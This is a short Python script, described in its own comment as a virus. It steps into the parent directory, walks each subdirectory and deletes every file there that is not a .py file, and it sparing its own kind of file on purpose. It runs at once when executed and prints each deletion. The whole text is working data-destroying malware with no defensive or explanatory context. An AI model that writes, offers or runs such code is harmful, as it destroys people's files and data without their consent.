import os
import sys

def delete_files():
    os.chdir('..')
    directories = os.listdir()
    for dir in directories:
        if os.path.isdir(dir):
            os.chdir(dir)
            files = os.listdir()
            for file in files:
                if not file.endswith('.py'):  # Avoid deleting the virus itself
                    try:
                        os.remove(file)
                        print(f"Deleted {file}")
                    except Exception as e:
                        print(f"Failed to delete {file}: {e}")
            os.chdir('..')

delete_files()
